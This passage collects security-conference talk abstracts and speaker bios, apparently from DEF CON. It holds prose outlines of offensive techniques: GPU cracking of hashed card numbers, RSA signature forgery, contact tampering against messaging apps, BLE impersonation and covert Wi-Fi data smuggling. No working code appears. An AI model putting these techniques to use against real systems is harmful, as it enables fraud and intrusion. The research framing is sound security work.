constitutes “us,” and we are known by others more deeply in recombination than we know ourselves.\nTo understand privacy - even what we mean by “individual human beings” who want it - requires a contrary opinion. Privacy is honored in lip service, but not in the marketplace, where it is violated or taken away or eroded every day. To confront the challenges generated by technological change, we have to know what is happening so we can re-imagine what we mean by privacy, security, and identity. We can't say what we can't think. We need new language to articulate our experience and grasp the nature of the context in which we live. Then we can take the abstractions of data analytics and Big Data down to our level.\nThe weakest link in discussions of privacy is the definition of privacy, and the definition of privacy is not what we think. But pursue the real at your peril: Buddhists call enlightenment a “nightmare in daylight.” Yet when the screaming stops, it is enlightenment, still, after all. That clarity, that state of being, is the goal of this presentation.\n\nBio:\nRichard Thieme is an author and professional speaker focused on the challenges posed by new technologies and the future, how to redesign ourselves to meet these challenges, and creativity in response to radical change. ”His column, \"Islands in the Clickstream,\" was distributed to subscribers in sixty countries before collection as a book in 2004. When a friend at the National Security Agency said after they worked together on ethics and intelligence issues, \"The only way you can tell the truth is through fiction,\" he returned to writing short stories, 19 of which are collected in “Mind Games.” His latest works include the stunning novel “FOAM,” (Exurban Press September 2015) and \"A Richard Thieme Reader\" (Exurban Press 2016) in 5 volumes of collected fiction and non-fiction on Kindle. He is also co-author of the critically extolled “UFOs and Government: A Historical Inquiry,” a 5-year research project using material exclusively from government documents and other primary sources, now in 65 university libraries\n\nSocial media links if provided:\n@neuralcowboy",

Surely you can get to the bottom of the situation by checking your security logs… right? Right? Probably not, in fact.

Many papers have already discussed the fragility of cryptographic constructions not using nothing-up-my-sleeve numbers, as well as how such numbers can be safely picked.

Interestingly PCI does not require using salts or other advanced hashing techniques to strengthen these hashes. Using oclHashcat with a custom patch of our own, a list of valid IINs, and a GPU cracking rig we will show how to reverse the supposedly irreversible one-way hashes of payment card numbers, ultimately demonstrating that we can completely crack a “PCI Compliant” database of hashed PANs in a few hours.\n\nBio:\nqu0rum started life as a developer during the dot com boom and quickly realized that writing secure code is a lot harder than breaking other people’s code so he hooked up with a security consulting company and got into penetration testing back before that was a popular thing to do. 15 years later he has handed off the day-to-day pen testing responsibilities to a new generation of testers and spends most of his time working with clients’ executives, convincing them that they should have someone test their security and figuring out what their testing programs should look like, but he’s still breaking stuff and writing about it in a desperate attempt to save the world from its own horrible code.\n\nAs his straight-laced corporate alter-ego, qu0rum has presented at a number of information security conferences including Black Hat Briefings USA, RSA Conference, Infosec World, the ISSA Conference, Computerworld Expo, and at United States Secret Service Electronic Crimes Task Force meetings.

By breaking some yourself, live. After doing hash extension and CBC padding oracles the past years, today we'll implement one of the evergreens of crypto attacks: the Bleichenbacher '06 e=3 RSA signature forgery.\n\nBleichenbacher '06 is a common attack against RSA that allows an attacker to fake a signature. It broke Firefox, then GnuTLS, then again Firefox (BERserk), then python-rsa... And who knows next. You'll learn how it works, how to mount it, and then attack real world implementations with your own code.\nThe session is 100% hands-on, with very little material (basically just docs, a target server implementation, and some client boilerplate). I'll explain the crypto and attack basics and then proceed to code the exploit live, along with the audience, stopping often to analyze and compare outputs and milestones.\nNo slides, just cold hard code and data produced along the way.\nNo cryptography experience needed at all.

As the data on the Web becomes more valuable, more sophisticated attacks on authentication are being developed. The good thing is that crypto community tries to keep up with the continuously increasing threat surface and provides more advanced authentication techniques with higher security guarantees. However, password is still a solid building block in each of them: the first part of most two-factor authentication schemes is a password challenge, to generate one-time token, you enter a password, to use a hardware device - you enter a password in the device. But is verifying passwords secure? By communicating a password to a verifying party you leak at least some of the password information. Given the long history of password-based authentication schemes we can clearly see that it is rather challenging even to properly implement password verification. The presentation gives an overview of the evolution of password-based authentication schemes and provides comparison between two of the latest ones: socialist millionaires’ protocol and SPAKE2.\n\nBio:\nIgnat is a security engineer at CloudFlare working mostly on platform and hardware security. Ignat’s interests are cryptography, hacking, and low-level programming. Before CloudFlare, Ignat worked as senior security engineer for Samsung Electronics’ Mobile Communications Division. His solutions may be found in many older Samsung smart phones and tablets.

With debates at the government level to ask for backdoors, those tools are perceived as unbreakable. Yet, most of the implementations trust the contact information stored in the smartphone. Given that end-users hardly know a few phone numbers and that modifying contacts is easy, we will introduce a new type of attack: Man In The Contacts (MITC). Without studying any cryptography, we will examine how WhatsApp, Telegram and Signal behave when an Android application is tampering with the contacts in background. For some scenarios, the end-user can be fooled in talking to the wrong person and a MITM proxy can be implemented. Finally, we will discuss about countermeasures both at the technical and usability levels.\n\nBio:\nJeremy Matos has been working in building secure software over the last 10 years. With an initial academic background as a developer, he was involved in designing and implementing a two-factor authentication product with challenging threat models, particularly when delivering a public mobile application. As a consultant he helped in the security requirements definition and implementation, including cryptographic protocols, for applications where the insider is the enemy. He also led code reviews and security validation activities for companies exposed to reputation damage. In addition, he participated in research projects to mitigate Man-In-The-Browser and Man-In-The-Mobile attacks.\n\nSocial media links if provided:\n@SecuringApps",

LoRa is a proprietary Low Power Wide Area Network (LPWAN), an emerging class of wireless technology similar to cellular data service but optimized for embedded and IoT applications. LoRa is unique because it uses a chirp spread spectrum modulation that encodes data into RF features more commonly seen in RADAR systems. The protocol's rapid adoption rides on its use of unlicensed ISM frequency bands, both avoiding costly spectrum licensing requirements and democratizing long-range network infrastructure to consumers and new commercial entrants alike. After briefly introducing the audience to LPWANs, I will walk through the SDR and DSP techniques required to demodulate and decode LoRa's novel closed-source waveform. In addition I will introduce gr-lora, an open-source GNU Radio module that can be used to implement LoRa security test tools, LoRaWAN gateways, and end node applications.",

The three goals for this talk: 1) Familiarization  youll get the basics of the Attribute Protocol (ATT) and the Generic Attribute Profile (GATT), 2) Tools  a quick look at essential tools such as bluez, bleno, ubertooth, PyBT, crackle, scapy, as well as our custom tools, and how to use them, and 3) Fun  along the way, well show you how to impose your will on a set of commercially available industrial sensors using techniques like passive credential sniffing, BLE server cloning and impersonation, and reverse engineering at the application layer. Why? Theres arguably no better time to get into BLE security, as it continues to proliferate in a wide variety of markets. Some of the more interesting BLE stuff you can buy include: breathalyzers, pad/bike/door locks, fitness trackers, heart rate monitors, temperature sensors, data loggers, fluid pressure gauges, water well depth readers, garage door openers, automotive OBDII sensors, pressure cookers, running socks, prosthetics, and you guessed it, baby pacifiers. \"",

			"description": "The Covert Cupid Under .11 Veil !!! /* Approach for Covert WIFI */\n\nAbstract\n\nThe excursion started while understanding mitigation techniques for various attacks on wireless networks. It evolved past timing monitoring, fuzzing, packet inspection, pattern recognition, intrusion detection, intrusion prevention, so on and on and on. So many ways to attack and indeed, so many ways to prevent. An obvious question that might pop (|| push ?) here is, what big difference our approaches making in this regard? Well, the answer is multifold. The one line compression of the multifold is Either smuggle the data in legit communication or make it invisible otherwise. This may sound little unorganized, but holds a lot of connecting links, strong enough for sure. So where in the packet data sits? For a normal user, it sits in the PAYLOAD field. Here comes rule (|| obligation?), Do not abide by RFCs and standards. So for us, data does not sit in payload field. The data sits somewhere else. The full discussion will follow in respective para. #1.Information elements approach Beacon frame is essential element in the wireless networks abiding by IEEE 802.11 STANDARDS. As it's been said, easy to see is easy to miss, these beacon frames can actually lead us to something interesting should they be used in different way. Beacon frame populates air with a rate of around one frame per 100 milliseconds. Stats may vary with tweaks in the access point properties though. The intelligence we will be using here about beacon frames is, they are abundantly available, requires no authentication and/or association with access points to listen to them (lot and lots of viral, indeed!). Zeroing down on the frame structure, we found many avenues for shipping the data, though no official \"\"payload\"\" parameter is available. The parameters of interest are: Information elements like SSID, DSset, TIM, Rates, ESRates, initialization vector, Rates, FHset, CFset, TIM, IBSSset, challenge, ERPinfo, QoS Capability, ERPinfo, RSNinfo, vendor, challenge text, extended support rate, TPC report, reserved and many more. Delving further on frame categories we have found that even probe request and response frames are capable of shipping such data with little legit (|| illegit?) tweak in the format. Proof of Concept: All around the IEEE802.11 implementation, ACK frames or RESPONSE frames are of significance to reply to certain communication initiated by the remote host earlier. This infers the trust is already in place between two hosts. Now thanks to monitor mode, the responses or acknowledgements sent by unsolicited user will receive little low priority of inspection as it has been assumed that such responses are bound to come from a legit source on peripheral devices. A minute subversion to information elements approach: Can we ship the earlier discussed Information Elements with data here as well? Yes, certainly. The response traffic is always made more intelligent as they are capable of assigning sequence and discipline the traffic at receiver end. This provides more comfort to an attacker. Reassembling of the data chunks at receiver end made easy for him. The parameters which could come handy are, Frame Control, Frame Control Sequence, More Data, More Fragments, Sequence Numbers, BSSID, ESSID and essentially \"\"Source Address\"\" etc.",

Transmitting audio using analog modulation techniques is still common (e.g. broadcast FM, AM, HAM bands, trunked radio networks), but what about more complex signals? Terrestrial digital television (ATSC & DVB-T) has replaced the old NTSC/PAL/SECAM channels we were used to, but NTSC has made an interesting comeback in First Person Video links for drones (digital solutions are becoming more popular, but latency has to be kept very low). GNU Radio can be used to develop a prototype NTSC demodulator for viewing these FPV links. Its back to the old world of interlacing and the back porch! Ill describe how a NTSC signal is constructed, and interactively demonstrate how to build a simple flowgraph to display video frames. If you have an FPV system, please bring it along so we can capture another source! Another analog signal still very much in use, which does not transmit your traditional idea of information, is RADAR. One type is Frequency Modulated Continuous Wave (FMCW). It is an intuitively simple waveform, and has some great properties for seeing whats out there (for example, it is all over the HF band). GNU Radio can be used to synthesise and process FMCW signals. Ill show why FMCW works, demonstrate signal processing with offline tools, and construct some simple flowgraphs to do it real-time with GNU Radio. If theres time, Ill preview some other SDR experiments, such a decoder for the downlink path of the INMARSAT Aero aviation satellite service, and a spot jammer.\"\n",

We have numerous options for innovative and inexpensive software-defined radio, a myriad of embedded processors, a variety of powerful development environments, and plentiful and cheap general-purpose processors. Data ubiquity has revolutionized personal and professional communications. Everyone has a cell phone and digital communications have triumphed over all. Communications is a solved problem!\n\nWell, hold the phone. While many frequency bands have plenty of hardware, software, and firmware choices, there are many exceptions. Amateur radio microwave bands are still dominated by bespoke rigs producing narrowband analog voice and CW. Activity is mainly during contests, with beacons holding down the spectral fort for the long months between events. We are working very hard to change this situation in a fundamentally positive way.\n\nAMSATs next generation of digital microwave satellites is moving firmly into the 5GHz/10GHz bands. This is where the bandwidth is at, this is where the current professional interest lies, and this is where we must become competent designers and more plentiful operators.\n\nIn order to operate, radios must exist. Buying inexpensive off-the-shelf equipment to work these new digital satellites is not an option for the microwave bands. We believe that we must provide solutions for radios for the satellite service, otherwise these satellites will simply not be used. These solutions must include instructions on how to build rigs from scratch, instructions on how to build up rigs from existing components and radio gear, and a quality manufactured solution that can also be used for emergency communications services.\n\nThe amateur satellite service alone may not justify the expense and effort required to design and build a new radio system. But, this is the age of software-defined radio. Since the selected waveforms for AMSAT digital satellites and the waveforms for terrestrial digital television are from the same family of standards, we have a wonderful opportunity to make a radio that will do both space and ground. This opens up both amateur terrestrial and amateur space markets.\n\nBut were not done yet. If intelligently designed, this radio is also microwave band test equipment, providing yet another market. Phase 4 Ground exists to make this radio a reality. Come listen to what Phase 4 Ground Team has done so far to design this radio, and where we are going next!",

The traditional approach is to scan the spectrum, either actively or passively, to try to discover unknown wireless networks while passing them. Single-frequency scans carry the risk of not finding networks or being foiled by frequency hopping strategies. The wardriving of tomorrow should mitigate these risks with \"\"full-take\"\" spectrum captures that eavesdrop on every channel simultaneously. IEEE 802.15.4 is a simple wireless protocol that has 16 channels in the unlicensed 2.4 GHz band, and is gaining traction in the IoT world. Many hacking tools like KillerBee and Api-Mote have been developed for it, which rely on scanning to find new networks. Recent approaches to multi-channel 802.15.4 sniffing use either software defined radio or a cluster of existing sniffers. These approaches can be expensive, clunky, and sometimes do not cover every channel. We promote a third, hardware based approach based on multiple radio transceivers embedded into a single device. This talk features a short analysis of IEEE 802.15.4 sniffing technologies and presents a new design for a multi-channel sniffer. \"",

How to stop single step is also a critical research topic from anti-debug perspective. During the research of xmode code obfuscation (code with runtime 32bit/64bit mode switch), we found a very interesting point that WinDbg is not able to properly carry out single step command under certain situation. We wonder what's the reason behind it, is it a WinDbg bug or due to something else? We made in-depth investigation to answer these questions.\n\nThis open-source project will demonstrate how to disable single step debugging in WinDbg with xmode code. We will also reveal the details of this issue from system perspective.\n\nKe Sun is an independent security researcher. He focused on malware analysis, and reverse engineering.

Some things you need to know to get started:\n\nWhat is Crash and Compile?\n\nWhat happens when you take an ACM style programming contest, smash it head long into a drinking game, throw in a mix of our most distracting helpers, then shove the resulting chaos incarnate onto a stage? You get the contest known as Crash and Compile.\n\nDo you think you can code? Do you think you can code while drinking? We are looking for nine teams who think they have the smarts, the concentration, and the liver to hold up to our gauntlet of programming. Teams who can not only code, but do so with style. We set you against the clock and the other teams. And because they think watching people simply code is boring, our \"Team Distraction\" is has taken it upon themselves to be creative in hindering you from programming, much to the enjoyment of the audience. \n\nQualifications take place Friday afternoon in the contest area. Teams of one or two people. Be ready to code, as this won't be easy. The top nine teams who showed themselves ostentatious enough to take on our challenge will compete on the Contest Stage Saturday.\n\n\nAs much as it would be great to have more people competing, Crash and Compile only has space for nine teams during the main contest. It's highly competitive, and so we only the best move on to the coveted nine spots. But how do we know you are the best? That's where the qualification round comes in. In years past, this would happen prior to DEF CON. But as you can guess, many people had difficulty finding time to work on this on top of life and all the other things which happen just before DEF CON. To get more involvement, and give everyone a chance to try out Crash and Compile, last year we moved the qualification round to Friday during DEF CON, and this worked awesomely. We had more people try out for Crash and Compile than we had ever had. So we are doing the same this year.\n\n\nKey points:\n\n* Qualifications start on Friday at 12pm in the Contest Area.\n* Teams are up to two people.\n* We encourage you to try out, even if you don't think you could qualify. The problems are fun, and you learn something by doing. DEF CON is all about getting involved.\n* You will need your laptop setup with the development environment of your choice.\n* You can't compete if you can't code. Repeat, you need your laptop. If you worry about getting haxored by the evil defcons, then throw a distro of linux on a new drive, and you will be fine.\n* During the qualification round, use whatever method of getting to the internet as you would like, either via DEF CON's wireless network, your hotel room, cellular modem, AOL dial up, etc..\n* During the contest if you qualify, network access is wired via the DEF CON network. Means you are isolated from the wireless, but you do need a network interface (looking at you Mac users)\n* During qualifications you get two hours to complete the sample problems. Didn't finish, not a big deal, we're looking on how well you did, and what you've submitted. We announce who made it to the main contest later that evening, as well as any alternate teams, should someone have to bail.\n* The contest runs on the main stage in the contest area. It consists of several rounds, as you accumulate points for problems completed, beers drank, and perhaps even style points (awarded for particular badassery)\n\n\nHow problems work:\n\nYou get a problem description, sample input and sample output. You have to write a program that can, based on the problem description, read in the sample input, and output the sample output. Simple right?\n\nInterface to the contest is web based. The program input is generated randomly, and you get five minutes to download the sample input, run it through your program, and then upload the sample output, as well as a copy of your source code. Don't make it in five minutes, you can try again. We do present you with a simple \"Hello World\" test case to make sure you are set before starting the timed portion.\n\n\nWe hope to see you there.",

Since implanting himself, he’s written a book called RFID Toys, become a TEDx speaker, appeared on a multitude of television programs, and been the subject of various documentaries. He's also started a biohacking company called Dangerous Things which developed the world’s first and only NFC compliant implantable transponder. He continues to explore biohacking and transhumanism while developing next generation implantable technologies. \n\nAbstract:\nAmal covers the rise of biohacking, implantables, and the future of biohacking.\n\n",

Now I'm a life coach and Cannabis community organizer. \n\nAbstract:\nCannabis is a powerful technology and it has not been hacked nearly enough. Mostly because for a long time it's been illegal to do so in meaningful ways. Industrial hemp can be used for over 20,000 purposes, yet there are significant challenges to process it. Cannabis medicine has effectively treated dozens of ailments, yet precise dosing and predictable effects have yet to be developed. Legalization is creating a number of policy questions, how do we police impaired driving? How do we make sure the powers that be don't create a new system that is racially biased and completely unjust?",

He was recently named as one of 35 innovators under 35 by the Technology Review for his work tackling reproducibility in biomedical research. \n\nHe is on a leave of absence from the MIT Media Lab where he was an IBM PhD Fellow in Joe Jacobson’s Molecular Machines group, and jointly in the Church lab at the Wyss Institute at Harvard Medical School. Charles is the recipient of several awards including IBM PhD fellowships, an Extraordinary Minds fellowship, one of the first Awesome Foundation fellowships and an Amplify Partners fellowship. He is the author of several patents and is actively authoring more in the field of future laboratory tools. Charles has also been involved in obtaining numerous grants and contracts from DARPA,NSF, Google X, Knight Foundation and the Shanghai High Tech Incubator totaling several millions since 2012. \n\nCharles has spoken about his work at many different venues and online including the White House, MIT Sloan, NASA Ames, IBM Research, Airbus, O'Reilly and HackADay. His current academic interests lie at the intersection of biological engineering and electronics called digital bioengineering. He was the Biology track chair at SOLID2015 mixing biology, electronics and computer science, instigated, and helped organize the Bits <-> Bio conference, has represented Boston for the Hello Tomorrow challenge (European 100k), and is a founding member of the first US bio-hackerspace. \n\nCharles obtained his bachelor’s at Imperial College London, where he worked on a bioelectronic interface between engineered bacteria and electronic sensors. He continued his thesis work at IBM Research, where he has been encouraging research in the field ever since. Charles worked as an early intern at Ginkgo Bioworks, where he developed many of the automated assembly pipelines still used today. \n\nAbout Charles Fracchia:\nJoel finished his bachelor's degree from Hampshire College in 2014, where he designed his own major, blending studies in cellular and molecular biology, neuroscience, and electrical and computer engineering. At Hampshire, Joel received the Ray and Lorna Coppinger Grant to lead a project developing an optogenetic interface for P19 differentiated neuronal cells. Later, while interning in the Robinson Neuroengineering Lab at Rice University, Joel worked to design and implement a novel platform to investigate single neuron computation using optogenetics and patch-clamp electrophysiology.\n\nAbstract:\nBiological research is dominated by proprietary, black-box tools. This is hindering reproducibility, accountability and the advent of a more open scientific ecosystem. In this talk, we show the reverse engineering of two devices used in nearly every molecular biology experiment: a pipette and a -80ºC freezer. We show how reverse engineering these tools is not only fun, but necessary to enable open science. We will also put this work within the larger context of our effort to create open, interoperable data in biomedical research.",

			"description": "About John Sundman:\nJohn Sundman has been writing about hacking in general and biohacking in particular, in both fiction and nonfiction genres, for twenty years. His 1999 novel Acts of the Apostles anticipated many of the developments we're seeing today. \n\nOf Sundman's novels, the legendary synthetic biologist George Church said, \n\n\"Sundman is a master of machines —computing, biological and political — and his books include details that will convince an expert, and yet enchant a distant outsider with a compelling page-turner plot. Not just plot and mechanisms, but unforgettable personalities that haunt us long after the pages stop.\" \n\nA 1+ hour conversation between me & Church can be found here. \n\nAbstract:\nThe convergence of biological and digital technologies is one of the most significant aspects of the world we inhabit -- perhaps *the* most significant, since from this convergence we can plausibly extrapolate to near futures featuring everything from the elimination of poverty, want and death to the end of life on earth. This trend has been evident for a while, but CRISPR puts it in our faces. \n\nUnlike, say, nuclear technology, biodigital technology is inherently democratic. We are in a biohacking maker world, and we're not going back. \n\nThe positive uses for these technologies are limitless, and many of them easy to imagine. The dangers are a little less obvious, but many of them can be anticipated, and there are certain to be unanticipated dangers as well. The potential for societal disruption, among others, has been widely underestimated. \n\nWhat ethical responsibilities do biohackers and scientists bear? And do artists and intellectuals, writers in particular, have an obligation to take on these subjects, maybe even provide some guidance?",

Requiring little sleep, and seemingly immune to alcohol, he is consistently seen at hacker events across the country while never seeming to actually do any work. With no verifiable credentials or formal training, there is the strong possibility he is making all of this stuff up. \n\nAbstract:\nGingerBread will present one mans take on the current state of nootropics and other cognition-enhancing drugs. Beginning with the neuro-enhancing drugs of the ancient Ayurveda and Traditional Chinese Medicine, working our way through the developments of the 1990s and 2000s, and finishing with the chaotic internet connected and unregulated world of today. \n\nFrom Gingko Biloba to Pig Brain Concentrates, from cutting-edge science in million-dollar state of the art labs, to the crowd sourcing of syntheses for never-before-tested-in-man substances to be manufactured by the lowest bidder and distributed to the public wholesale. \n\nI will present a few case study examples of both objective successes, and undeniable failures with self-experimentation. GingerBread will try and explain (to the best of my ability) a bit of what we know about the action of these drugs, why we think we know it, as well as ongoing developments in the fight to preserve cognition in the elderly and infirmed and to push the abilities of healthy individuals past their biological limitations.",

Exactly what does \"gene editing\" involve? What can be done right now in big labs? What about in your basement? Harvard Medical School professor George Church argued that “garage biologists” should be required to have a license to practice synthetic biology, but right now it’s a kind of Wild West out there. Sound familiar? We survived all those 1980s Commodore 64 computer hacking pranks and learned a lot from them. Then again, they didn’t involve E. coli and the possibility of mass annihilation. This presentation sorts out the biofacts from the biofiction, and suggests how DIY biology fans can use CRISPR/Cas9 to help make things better for themselves and the world.",

She currently specializes in energy sector and industrial control system security. Prior to her career in security, Jennifer studied biology and psychology and focused her studies on neurology. Her passion for brain science, coupled with computer science, has been a driving factor in her interest in the technological singularity and human/machine integration. In her free time she runs a robotics club for kids, is learning to play the ukulele, and watches far too much tv. Jennifer should probably get a life.

			"description": "About Melanie Stegman:\nI left my post doc in biochemistry and microbiology to manage the Immune Attack project at the Federation of American Scientists. The game Immune Attack introduces receptors, clouds of cytokines, cytokinesis, and receptor mediated phagocytosis. The game pulls players into the world of cell to cell signaling and molecular immunology. The game was intended to teach basic cellular immunology to college students. However, I felt that Immune Attack could teach molecular cell biology and teach it to younger students. \n\nI created a multiple choice test of molecular and cellular immunology based on the game. I also showed players complex molecular biology images from Nature Immunology Reviews and asked them, “Do you think you could understand this?” Immune Attack students clearly learned molecular immunology and clearly gained confidence in their ability to understand related diagrams (Stegman, 2014). Based on this research, I designed a sequel game, Immune Defense. \n\nI am the chair of the DC chapter of the International Game Developer Association (IGDA). I attend regional and national game developer conferences and my game Immune Defense has been accepted in many competitive commercial game expos. I play a lot of video games. A wide range of audiences are interested in my work: I spoke at national meetings for the Association of Medical Illustrators, the National Science Teachers Association, the Serious Play Conference, Games Society and Learning, and the American Society for Cell Biology. \n\nMy intense time as a “post doc” in serious game design and development has taught me many important skills: 1. How to tease out the core elements of concepts and create an engaging game mechanism. 2. How to present ideas to and collaborate with programmers, artists and other game development professionals. 3. How to playtest and iterate the game so that it is fun and intuitive for players. I have an in depth understanding of the principles of biochemistry and cell biology, the creative vision to produce interactive Technology that presents these principles and experience testing iterative game designs for effectiveness.\n \nAbstract:\nI am sure that many of you have wished you had an primer for cellular and molecular biology. You could hand this primer to your friends and say, just check this out! Then your friends could understand better what your biohacking is all about. I made a video game that serves as this primer (Immune Defense). Then I made a site for all kinds of science games: ScienceGameCenter.org \n\nStories and games can make complex concepts common knowledge. If you doubt that games can teach such complex things, go read the Wikipedia page for The Legend of Zelda Ocharina of Time. After trying to stagger through all that data, ask 3 random people how to outsmart a Deku shrub and one of them will know right away. You know how to kill a zombie, you understand the difference between a shotgun and a rifle in a game… You could learn the difference between a positron and a helium atom, how to do Punnet squares. You can even play games that create data, like Fold It, Eye Wire, Phyllo… There is even a game call Hero Coli, that uses biobricks to give a heroic e coli new traits. \n\nI will discuss what makes a game a well designed game, why that also proteins to science games and how a few games in particular do an excellent job at teaching abstract, complex fundamental concepts. \n",

Between us, we've got decades of bricking experience that we'd like to share. We'll document the most common ways of temporarily or permanently damaging your hardware and ways to recover, if possible. We'll also talk about tips on how to avoid bricking your projects in the first place. If you're getting into hardware hacking and worried about messing something up, our stories will hopefully prevent you from experiencing the same horrors we did. If you're worried about an uprising of intelligent machines, the techniques discussed will help you disable their functionality and keep them down.\n\nJoe FitzPatrick is an Instructor and Researcher at https://SecuringHardware.com.

It will include a copy of everything from https://infocon.org/ plus more.\n\nHERE IS HOW IT WILL WORK\nDEF CON will provide a core set of drive duplicators as well as content. It will be a first come, first served situation. Bring and label your 6TB SATA blank drives, and put them in the queue for the data you want and 14 hours later it is ready for pick up.\n\nSTART EARLY!\nThe first batch will happen Thursday evening, so if you want in come by the event area. While it will be closed to everyone for setup there will be a table where you can drop off drives between 6pm and 7pm.\n\nLOCATION\nBally's \"Palace 7\" room.\nThe \"Palace\" rooms are on the Bally's side between the elevators and the Contests/Events space.\n\nWHAT TO BRING\n_ 6TB SATA3 new drive(s) - If you want a full copy of everything you will need three. Western Digital RED drives are to be AVOIDED.\n_ Any data you want to contribute to be shared, in USB, HDD, or DVD format.\n\nYou can both contribute data to be duplicated, as well as bring blank drives to get copies and help spread the knowledge.\nThose who want to share their own collections or help with duplication are encouraged to bring their own collections and drive dupers. If your collection is smaller we are thinking of getting some USB thumb drive duplicators for smaller batches. We also will have a DVD duper tower, so bring those legacy DVDs.\n\nTHE DATA DUMP\nHere is what we are planning to make available:\n\n6TB drive 1-3: All past hacking convention videos that DT could find, plus video collections from popular YouTube channels, and other sources.\n6TB drive 2-3: freerainbowtables.com hash tables (1-2)\n6TB drive 3-3: GSM A5/1 hash tables plus remaining freerainbowtables.com data (2-2)\n\nWANT TO ADD TO THE DATA DUMP?\nIt's not too late. Know of a collection you want included? A repository you want mirrored? Post here with a link and I'll let you know if it makes it on the drive.\n\nHOW IT WORKS\nLabel your drive(s) with your name, which collection number you want on it, how to contact you, and then check it in. It will be put in the queue for duplication on a first come - first served basis.\n\nBring your own drive duplicators and help share the data for more people. Hang out, make friends!\n\nNOTES\nDuplicating a 6TB (About 5.46 usable) drive at ~110 Megabytes a second comes out to about 13.8 hours. I'll know more once I to a test duplication. This means the first dupe will start early in the morning, and the second dupe late at night. We will create a schedule so you know when the deadlines to check in drive is.\n\nWe will add more dupers to the collection and hope to have about 70-80 drives going at once. More details as we finalize orders.\n",
